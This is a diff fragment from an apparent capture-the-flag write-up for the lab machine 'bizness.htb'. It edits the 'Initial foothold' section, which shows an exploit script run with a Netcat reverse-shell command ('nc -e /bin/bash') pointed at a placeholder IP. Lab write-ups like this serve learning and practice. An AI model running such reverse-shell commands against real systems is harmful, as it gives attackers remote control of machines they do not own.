@@ -93,8 +93,8 @@ This behavious assures that page is indeed vulnerable. Searching for potential e
 
 ## Initial foothold
 
-Gaining initial foothold required some tweaking with used reverse shell, as typical bash or Python shell didn't work with this machine.
-Finally I've gained access using Netcat reverse shell:
+Gaining initial foothold required some tweaking with the reverse shell, as typical bash or Python shell didn't work with this machine.
+Finally I've gained access using Netcat reverse shell and specyfing https (as machine used public key):
 
 ```bash
 > python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash xx.xx.xx.xx 1234'         
